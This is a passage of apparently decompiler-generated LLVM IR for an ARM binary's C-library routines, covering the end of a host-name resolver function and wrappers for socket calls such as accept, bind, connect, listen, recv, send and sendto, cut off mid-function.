  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ce44 = load i32, i32* @r5, align 4
  %v9_ce44 = load i32, i32* @r6, align 4
  %v12_ce44 = load i32, i32* @r7, align 4
  %v15_ce44 = load i32, i32* @r8, align 4
  %v18_ce44 = load i32, i32* @sb, align 4
  %v21_ce44 = load i32, i32* @sl, align 4
  %v24_ce44 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_ce54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ce54, i32* @fp, align 4
  %v2_ce54 = icmp eq i32 %v0_ce54, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_ce64 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_ce64, align 4
  br i1 %v2_ce54, label %bb, label %dec_label_pc_ce70

bb:                                               ; preds = %entry
  %v1_ce68 = load i32, i32* %r0.global-to-local, align 4
  %v2_ce68 = add i32 %v1_ce68, 22
  store i32 %v2_ce68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d194

dec_label_pc_ce70:                                ; preds = %entry
  %v0_ce70 = call i32 @__errno_location()
  store i32 %v0_ce70, i32* %r0.global-to-local, align 4
  %v3_ce74 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_ce74, i32* %ip.global-to-local, align 4
  %v1_ce78 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce78 = load i32, i32* %v1_ce78, align 4
  store i32 %v2_ce78, i32* @r8, align 4
  %v0_ce7c = load i32, i32* @r6, align 4
  store i32 %v0_ce7c, i32* %v1_ce78, align 4
  %v0_ce80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_ce70, i32* @r5, align 4
  %v0_ce90 = load i32, i32* @fp, align 4
  store i32 %v0_ce90, i32* %r0.global-to-local, align 4
  %v0_ce94 = load i32, i32* @sl, align 4
  store i32 %v0_ce94, i32* %r2.global-to-local, align 4
  %v0_ce98 = load i32, i32* @r7, align 4
  store i32 %v0_ce98, i32* %r3.global-to-local, align 4
  %v0_ce9c = load i32, i32* @r4, align 4
  %v7_cea4 = call i32 @__get_hosts_byname_r(i32 %v0_ce90, i32 2, i32 %v0_ce94, i32 %v0_ce98, i32 %v0_ce9c, i32 %v0_ce80, i32 %arg6)
  store i32 %v7_cea4, i32* %r0.global-to-local, align 4
  %v2_cea8 = icmp eq i32 %v7_cea4, 0
  br i1 %v2_cea8, label %dec_label_pc_d194, label %dec_label_pc_ceb0

dec_label_pc_ceb0:                                ; preds = %dec_label_pc_ce70
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_ceb4 = inttoptr i32 %arg6 to i32*
  %v2_ceb4 = load i32, i32* %v1_ceb4, align 4
  store i32 %v2_ceb4, i32* %r3.global-to-local, align 4
  %v7_ceb8 = icmp eq i32 %v2_ceb4, 1
  br i1 %v7_ceb8, label %dec_label_pc_cedc, label %dec_label_pc_cec0

dec_label_pc_cec0:                                ; preds = %dec_label_pc_ceb0
  %v7_cec0 = icmp eq i32 %v2_ceb4, 4
  br i1 %v7_cec0, label %dec_label_pc_cedc, label %dec_label_pc_cec8

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cec0
  %v3_cec8 = icmp eq i32 %v2_ceb4, -1
  br i1 %v3_cec8, label %dec_label_pc_ced0, label %dec_label_pc_d194

dec_label_pc_ced0:                                ; preds = %dec_label_pc_cec8
  %v0_ced0 = load i32, i32* @r5, align 4
  %v1_ced0 = inttoptr i32 %v0_ced0 to i32*
  %v2_ced0 = load i32, i32* %v1_ced0, align 4
  store i32 %v2_ced0, i32* %r3.global-to-local, align 4
  %v7_ced4 = icmp eq i32 %v2_ced0, 2
  br i1 %v7_ced4, label %dec_label_pc_cedc, label %dec_label_pc_d194

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cec0, %dec_label_pc_ceb0
  %v0_cedc = load i32, i32* @r7, align 4
  %v1_cedc = sub i32 0, %v0_cedc
  %v1_cee0 = urem i32 %v1_cedc, 4
  store i32 %v1_cee0, i32* %r3.global-to-local, align 4
  %v2_cee0 = icmp eq i32 %v1_cee0, 0
  %v0_cee4 = load i32, i32* @r8, align 4
  %v1_cee4 = load i32, i32* @r5, align 4
  %v2_cee4 = inttoptr i32 %v1_cee4 to i32*
  store i32 %v0_cee4, i32* %v2_cee4, align 4
  %v0_cf04.pre = load i32, i32* @r4, align 4
  br i1 %v2_cee0, label %dec_label_pc_cefc, label %dec_label_pc_ceec

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cedc
  %v1_ceec = load i32, i32* %r3.global-to-local, align 4
  %v2_ceec = sub i32 %v0_cf04.pre, %v1_ceec
  %v3_ceec = icmp ult i32 %v0_cf04.pre, %v1_ceec
  br i1 %v3_ceec, label %dec_label_pc_d190, label %dec_label_pc_cef4

dec_label_pc_cef4:                                ; preds = %dec_label_pc_ceec
  store i32 %v2_ceec, i32* @r4, align 4
  %v0_cef8 = load i32, i32* @r7, align 4
  %v2_cef8 = add i32 %v0_cef8, %v1_ceec
  store i32 %v2_cef8, i32* @r7, align 4
  br label %dec_label_pc_cefc

dec_label_pc_cefc:                                ; preds = %dec_label_pc_cedc, %dec_label_pc_cef4
  %v0_cf04 = phi i32 [ %v2_ceec, %dec_label_pc_cef4 ], [ %v0_cf04.pre, %dec_label_pc_cedc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_ceb4, align 4
  %tmp31 = icmp ult i32 %v0_cf04, 4
  br i1 %tmp31, label %dec_label_pc_d190, label %dec_label_pc_cf10

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cefc
  %v0_cf10 = load i32, i32* @r4, align 4
  %v1_cf10 = add i32 %v0_cf10, -4
  store i32 %v1_cf10, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_cf10, 8
  br i1 %tmp32, label %dec_label_pc_d190, label %dec_label_pc_cf1c

dec_label_pc_cf1c:                                ; preds = %dec_label_pc_cf10
  %v1_cf1c = add i32 %v0_cf10, -12
  store i32 %v1_cf1c, i32* %r3.global-to-local, align 4
  %v0_cf20 = load i32, i32* @r7, align 4
  %v1_cf20 = add i32 %v0_cf20, 4
  store i32 %v1_cf20, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_cf2c = inttoptr i32 %v1_cf20 to i32*
  store i32 %v0_cf20, i32* %v3_cf2c, align 4
  %v0_cf30 = load i32, i32* @r5, align 4
  %v1_cf30 = load i32, i32* @sb, align 4
  %v2_cf30 = add i32 %v1_cf30, 4
  %v3_cf30 = inttoptr i32 %v2_cf30 to i32*
  store i32 %v0_cf30, i32* %v3_cf30, align 4
  %tmp33 = icmp ult i32 %v1_cf1c, 32
  br i1 %tmp33, label %dec_label_pc_d190, label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf1c
  %v0_cf38 = load i32, i32* @r4, align 4
  %v1_cf38 = add i32 %v0_cf38, -44
  store i32 %v1_cf38, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_cf38, 256
  br i1 %tmp34, label %dec_label_pc_d190, label %dec_label_pc_cf44

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf38
  %v0_cf44 = load i32, i32* @r7, align 4
  %v1_cf44 = add i32 %v0_cf44, 44
  store i32 %v1_cf44, i32* @r6, align 4
  %v1_cf48 = add i32 %v0_cf44, 12
  store i32 %v1_cf48, i32* %r3.global-to-local, align 4
  %v0_cf4c = load i32, i32* @fp, align 4
  store i32 %v0_cf4c, i32* @r1, align 4
  store i32 %v1_cf38, i32* %r2.global-to-local, align 4
  store i32 %v1_cf44, i32* %r0.global-to-local, align 4
  %v3_cf5c = call i32 @strncpy(i32 %v1_cf44, i32 %v0_cf4c, i32 %v1_cf38)
  store i32 %v1_cf48, i32* %ip.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r6, align 4
  %v1_cf64 = load i32, i32* @r7, align 4
  %v2_cf64 = add i32 %v1_cf64, 12
  %v3_cf64 = inttoptr i32 %v2_cf64 to i32*
  store i32 %v0_cf64, i32* %v3_cf64, align 4
  %v0_cf68 = load i32, i32* @fp, align 4
  store i32 %v0_cf68, i32* %r0.global-to-local, align 4
  %v0_cf6c = load i32, i32* @r5, align 4
  %v1_cf6c = load i32, i32* %ip.global-to-local, align 4
  %v2_cf6c = add i32 %v1_cf6c, 4
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v0_cf6c, i32* %v3_cf6c, align 4
  %v0_cf70 = load i32, i32* @r7, align 4
  %v2_cf74 = inttoptr i32 %v0_cf68 to i8*
  %v3_cf74 = call i32 @inet_aton(i8* %v2_cf74, i32 %v0_cf70)
  store i32 %v3_cf74, i32* %r0.global-to-local, align 4
  %v2_cf78 = icmp eq i32 %v3_cf74, 0
  br i1 %v2_cf78, label %dec_label_pc_cfbc, label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf44
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_cf88 = load i32, i32* @sl, align 4
  %v2_cf88 = add i32 %v1_cf88, 8
  %v3_cf88 = inttoptr i32 %v2_cf88 to i32*
  store i32 2, i32* %v3_cf88, align 4
  %v0_cf8c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf8c = mul i32 %v0_cf8c, 2
  %v1_cf90 = load i32, i32* @sl, align 4
  %v2_cf90 = add i32 %v1_cf90, 12
  %v3_cf90 = inttoptr i32 %v2_cf90 to i32*
  store i32 %v2_cf8c, i32* %v3_cf90, align 4
  %v3_cf94 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_cf94, i32* %r2.global-to-local, align 4
  store i32 %v1_cf48, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_cfa0 = load i32, i32* @r5, align 4
  store i32 %v0_cfa0, i32* %r0.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @sl, align 4
  %v2_cfa4 = inttoptr i32 %v3_cf94 to i32*
  store i32 %v0_cfa4, i32* %v2_cfa4, align 4
  %v0_cfa8 = load i32, i32* @r6, align 4
  %v1_cfa8 = load i32, i32* @sl, align 4
  %v2_cfa8 = inttoptr i32 %v1_cfa8 to i32*
  store i32 %v0_cfa8, i32* %v2_cfa8, align 4
  %v0_cfac = load i32, i32* @sb, align 4
  %v1_cfac = load i32, i32* @sl, align 4
  %v2_cfac = add i32 %v1_cfac, 16
  %v3_cfac = inttoptr i32 %v2_cfac to i32*
  store i32 %v0_cfac, i32* %v3_cfac, align 4
  %v0_cfb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfb0 = load i32, i32* @sl, align 4
  %v2_cfb0 = add i32 %v1_cfb0, 4
  %v3_cfb0 = inttoptr i32 %v2_cfb0 to i32*
  store i32 %v0_cfb0, i32* %v3_cfb0, align 4
  %v0_cfb4 = load i32, i32* @r5, align 4
  %v1_cfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_cfb4 = inttoptr i32 %v1_cfb4 to i32*
  store i32 %v0_cfb4, i32* %v2_cfb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_cfbc:                                ; preds = %dec_label_pc_cf44
  %v2_cfbc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cfbc, i32* @r5, align 4
  %v1_cfc0 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_1e7b4.528 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_cfbc, i32* @r0, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  %v1_cfd8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e7b4.528 to i32), i32* %r0.global-to-local, align 4
  %v1_cfe8 = call i32 @__pthread_return_0()
  store i32 %v2_cfbc, i32* @r0, align 4
  %v2_cff4 = load i32, i32* @global_var_20eac.533, align 4
  store i32 %v2_cff4, i32* @r4, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  %v1_d004 = call i32 @__pthread_return_void()
  %v2_d010 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_20ea0.536 to i32), i32* %r3.global-to-local, align 4
  %v0_d01c = load i32, i32* @fp, align 4
  store i32 %v0_d01c, i32* %r0.global-to-local, align 4
  %v2_d020 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_d020, i32* %ip.global-to-local, align 4
  %v0_d024 = load i32, i32* @r4, align 4
  store i32 %v0_d024, i32* %r2.global-to-local, align 4
  %v6_d038 = inttoptr i32 %v0_d01c to i8*
  %v7_d038 = call i32 @__dns_lookup(i8* %v6_d038, i32 1, i32 %v0_d024, i32 ptrtoint (i32* @global_var_20ea0.536 to i32), i32 %v2_d010, i32 %v2_d020)
  store i32 %v7_d038, i32* %r0.global-to-local, align 4
  %v1_d03c = icmp slt i32 %v7_d038, 0
  br i1 %v1_d03c, label %.dec_label_pc_d168_crit_edge, label %dec_label_pc_d04c

.dec_label_pc_d168_crit_edge:                     ; preds = %dec_label_pc_cfbc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d168

dec_label_pc_d04c:                                ; preds = %dec_label_pc_cfbc
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_d060, 255
  br i1 %tmp35, label %dec_label_pc_d0fc, label %dec_label_pc_d068

dec_label_pc_d068:                                ; preds = %dec_label_pc_d04c
  %v3_d068 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_d068, i32* @r0, align 4
  %v0_d06c = call i32 @free()
  %v3_d070 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d070, i32* @r0, align 4
  %v0_d074 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_ceb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_d0fc:                                ; preds = %dec_label_pc_d04c
  %v3_d100.pre = load i32, i32* %stack_var_-96, align 4
  %v0_d104.pre = load i32, i32* @r6, align 4
  store i32 %v1_d060, i32* %r2.global-to-local, align 4
  store i32 %v3_d100.pre, i32* @r1, align 4
  store i32 %v0_d104.pre, i32* %r0.global-to-local, align 4
  %v3_d108 = call i32 @strncpy(i32 %v0_d104.pre, i32 %v3_d100.pre, i32 %v1_d060)
  %v3_d10c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_d10c, i32* @r0, align 4
  %v0_d110 = call i32 @free()
  store i32 %v0_d110, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_d118 = icmp eq i32 %tmp7, 1
  br i1 %v7_d118, label %dec_label_pc_d120, label %dec_label_pc_d174

dec_label_pc_d120:                                ; preds = %dec_label_pc_d0fc
  store i32 4, i32* @r2, align 4
  %v0_d128 = load i32, i32* @r7, align 4
  store i32 %v0_d128, i32* @r0, align 4
  %v0_d12c = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_cf48, i32* %r2.global-to-local, align 4
  %v1_d138 = load i32, i32* @sl, align 4
  %v2_d138 = add i32 %v1_d138, 8
  %v3_d138 = inttoptr i32 %v2_d138 to i32*
  store i32 2, i32* %v3_d138, align 4
  %v0_d13c = load i32, i32* %r3.global-to-local, align 4
  %v2_d13c = mul i32 %v0_d13c, 2
  store i32 %v2_d13c, i32* %r3.global-to-local, align 4
  %v1_d140 = load i32, i32* @sl, align 4
  %v2_d140 = add i32 %v1_d140, 12
  %v3_d140 = inttoptr i32 %v2_d140 to i32*
  store i32 %v2_d13c, i32* %v3_d140, align 4
  %v3_d144 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d144, i32* @r0, align 4
  %v0_d148 = load i32, i32* @r6, align 4
  %v1_d148 = load i32, i32* @sl, align 4
  %v2_d148 = inttoptr i32 %v1_d148 to i32*
  store i32 %v0_d148, i32* %v2_d148, align 4
  %v0_d14c = load i32, i32* @sb, align 4
  %v1_d14c = load i32, i32* @sl, align 4
  %v2_d14c = add i32 %v1_d14c, 16
  %v3_d14c = inttoptr i32 %v2_d14c to i32*
  store i32 %v0_d14c, i32* %v3_d14c, align 4
  %v0_d150 = load i32, i32* %r2.global-to-local, align 4
  %v1_d150 = load i32, i32* @sl, align 4
  %v2_d150 = add i32 %v1_d150, 4
  %v3_d150 = inttoptr i32 %v2_d150 to i32*
  store i32 %v0_d150, i32* %v3_d150, align 4
  %v0_d154 = call i32 @free()
  %v3_d158 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d158, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d160 = load i32, i32* @sl, align 4
  %v2_d160 = inttoptr i32 %v3_d158 to i32*
  store i32 %v0_d160, i32* %v2_d160, align 4
  %v0_d164 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_d164, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %.dec_label_pc_d168_crit_edge, %dec_label_pc_d120
  %v0_d16c = phi i32 [ 1, %.dec_label_pc_d168_crit_edge ], [ %v0_d164, %dec_label_pc_d120 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_d16c, i32* %v1_ceb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_d174:                                ; preds = %dec_label_pc_d0fc
  %v3_d174 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d174, i32* @r0, align 4
  %v0_d178 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_ceb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_d190:                                ; preds = %dec_label_pc_ceec, %dec_label_pc_cf38, %dec_label_pc_cf1c, %dec_label_pc_cf10, %dec_label_pc_cefc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %bb, %dec_label_pc_ced0, %dec_label_pc_cec8, %dec_label_pc_ce70, %dec_label_pc_d174, %dec_label_pc_d168, %dec_label_pc_d068, %dec_label_pc_cf84, %dec_label_pc_d190
  store i32 %v6_ce44, i32* @r5, align 4
  store i32 %v9_ce44, i32* @r6, align 4
  store i32 %v12_ce44, i32* @r7, align 4
  store i32 %v15_ce44, i32* @r8, align 4
  store i32 %v18_ce44, i32* @sb, align 4
  store i32 %v21_ce44, i32* @sl, align 4
  store i32 %v24_ce44, i32* @fp, align 4
  %v29_d198 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_d198

; uselistorder directives
  uselistorder i32 %v2_d13c, { 1, 0 }
  uselistorder i32 %v1_d060, { 1, 2, 0 }
  uselistorder i32 %v1_cf48, { 1, 2, 0, 3 }
  uselistorder i32 %v1_cf44, { 1, 0, 2 }
  uselistorder i32 %v1_cf38, { 2, 1, 0, 3 }
  uselistorder i32 %v0_cf04.pre, { 0, 2, 1 }
  uselistorder i32 %v1_cee0, { 1, 0 }
  uselistorder i32* %v1_ceb4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_ce54, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d194, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_d190, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_d168, { 1, 0 }
  uselistorder label %dec_label_pc_cefc, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d1b8 = load i32, i32* @r4, align 4
  store i32 %v3_d1b8, i32* %stack_var_-8, align 4
  %v5_d1bc = inttoptr i32 %arg3 to i32*
  %v6_d1bc = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_d1bc)
  store i32 %v6_d1bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_d1bc, -4095
  br i1 %tmp, label %dec_label_pc_d1dc, label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %entry
  %v0_d1cc = call i32 @__errno_location()
  %v0_d1d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d1d0 = sub i32 0, %v0_d1d0
  %v2_d1d4 = inttoptr i32 %v0_d1cc to i32*
  store i32 %v1_d1d0, i32* %v2_d1d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %entry, %dec_label_pc_d1cc
  %v0_d1dc = phi i32 [ %v6_d1bc, %entry ], [ -1, %dec_label_pc_d1cc ]
  %v2_d1e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d1e0, i32* @r4, align 4
  ret i32 %v0_d1dc

; uselistorder directives
  uselistorder i32 %v6_d1bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d1e4 = load i32, i32* @r4, align 4
  store i32 %v3_d1e4, i32* %stack_var_-8, align 4
  %v0_d1e8 = call i32 @bind()
  store i32 %v0_d1e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d1e8, -4095
  br i1 %tmp, label %dec_label_pc_d208, label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %entry
  %v0_d1f8 = call i32 @__errno_location()
  %v0_d1fc = load i32, i32* %r4.global-to-local, align 4
  %v1_d1fc = sub i32 0, %v0_d1fc
  %v2_d200 = inttoptr i32 %v0_d1f8 to i32*
  store i32 %v1_d1fc, i32* %v2_d200, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d208

dec_label_pc_d208:                                ; preds = %entry, %dec_label_pc_d1f8
  %v0_d208 = phi i32 [ %v0_d1e8, %entry ], [ -1, %dec_label_pc_d1f8 ]
  %v2_d20c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d20c, i32* @r4, align 4
  ret i32 %v0_d208

; uselistorder directives
  uselistorder i32 %v0_d1e8, { 1, 0, 2 }
  uselistorder i32 ()* @bind, { 1, 0 }
  uselistorder label %dec_label_pc_d208, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d210 = load i32, i32* @r4, align 4
  store i32 %v3_d210, i32* %stack_var_-8, align 4
  %v5_d214 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_d214, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d214, -4095
  br i1 %tmp, label %dec_label_pc_d234, label %dec_label_pc_d224

dec_label_pc_d224:                                ; preds = %entry
  %v0_d224 = call i32 @__errno_location()
  %v0_d228 = load i32, i32* %r4.global-to-local, align 4
  %v1_d228 = sub i32 0, %v0_d228
  %v2_d22c = inttoptr i32 %v0_d224 to i32*
  store i32 %v1_d228, i32* %v2_d22c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %entry, %dec_label_pc_d224
  %v0_d234 = phi i32 [ %v5_d214, %entry ], [ -1, %dec_label_pc_d224 ]
  %v2_d238 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d238, i32* @r4, align 4
  ret i32 %v0_d234

; uselistorder directives
  uselistorder i32 %v5_d214, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d234, { 1, 0 }
}

define i32 @listen() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d23c = load i32, i32* @r4, align 4
  store i32 %v3_d23c, i32* %stack_var_-8, align 4
  %v0_d240 = call i32 @listen()
  store i32 %v0_d240, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d240, -4095
  br i1 %tmp, label %dec_label_pc_d260, label %dec_label_pc_d250

dec_label_pc_d250:                                ; preds = %entry
  %v0_d250 = call i32 @__errno_location()
  %v0_d254 = load i32, i32* %r4.global-to-local, align 4
  %v1_d254 = sub i32 0, %v0_d254
  %v2_d258 = inttoptr i32 %v0_d250 to i32*
  store i32 %v1_d254, i32* %v2_d258, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d260

dec_label_pc_d260:                                ; preds = %entry, %dec_label_pc_d250
  %v0_d260 = phi i32 [ %v0_d240, %entry ], [ -1, %dec_label_pc_d250 ]
  %v2_d264 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d264, i32* @r4, align 4
  ret i32 %v0_d260

; uselistorder directives
  uselistorder i32 %v0_d240, { 1, 0, 2 }
  uselistorder i32 ()* @listen, { 1, 0 }
  uselistorder label %dec_label_pc_d260, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d268 = load i32, i32* @r4, align 4
  store i32 %v3_d268, i32* %stack_var_-8, align 4
  %v5_d26c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_d26c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d26c, -4095
  br i1 %tmp, label %dec_label_pc_d28c, label %dec_label_pc_d27c

dec_label_pc_d27c:                                ; preds = %entry
  %v0_d27c = call i32 @__errno_location()
  %v0_d280 = load i32, i32* %r4.global-to-local, align 4
  %v1_d280 = sub i32 0, %v0_d280
  %v2_d284 = inttoptr i32 %v0_d27c to i32*
  store i32 %v1_d280, i32* %v2_d284, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d28c

dec_label_pc_d28c:                                ; preds = %entry, %dec_label_pc_d27c
  %v0_d28c = phi i32 [ %v5_d26c, %entry ], [ -1, %dec_label_pc_d27c ]
  %v2_d290 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d290, i32* @r4, align 4
  ret i32 %v0_d28c

; uselistorder directives
  uselistorder i32 %v5_d26c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d28c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d294 = load i32, i32* @r4, align 4
  store i32 %v3_d294, i32* %stack_var_-8, align 4
  %v5_d298 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_d298, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d298, -4095
  br i1 %tmp, label %dec_label_pc_d2b8, label %dec_label_pc_d2a8

dec_label_pc_d2a8:                                ; preds = %entry
  %v0_d2a8 = call i32 @__errno_location()
  %v0_d2ac = load i32, i32* %r4.global-to-local, align 4
  %v1_d2ac = sub i32 0, %v0_d2ac
  %v2_d2b0 = inttoptr i32 %v0_d2a8 to i32*
  store i32 %v1_d2ac, i32* %v2_d2b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d2b8

dec_label_pc_d2b8:                                ; preds = %entry, %dec_label_pc_d2a8
  %v0_d2b8 = phi i32 [ %v5_d298, %entry ], [ -1, %dec_label_pc_d2a8 ]
  %v2_d2bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d2bc, i32* @r4, align 4
  ret i32 %v0_d2b8

; uselistorder directives
  uselistorder i32 %v5_d298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d2b8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d2c0 = load i32, i32* @r4, align 4
  store i32 %v3_d2c0, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_d2cc = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
